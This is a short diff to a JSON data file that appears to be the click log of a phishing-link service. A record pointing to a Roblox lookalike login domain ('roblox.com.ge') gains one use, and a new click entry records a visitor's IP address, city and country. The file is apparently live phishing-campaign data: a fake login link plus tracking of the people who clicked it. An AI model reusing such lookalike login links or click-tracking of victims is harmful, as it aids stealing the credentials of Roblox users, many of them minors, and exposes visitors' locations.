@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1030,
+    "useCount": 1031,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8360,6 +8360,14 @@
         "city": "Fayetteville",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777231158471,
+        "ip": "92.208.28.2",
+        "country": "Germany",
+        "city": "Essen",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
       }
     ]
   },
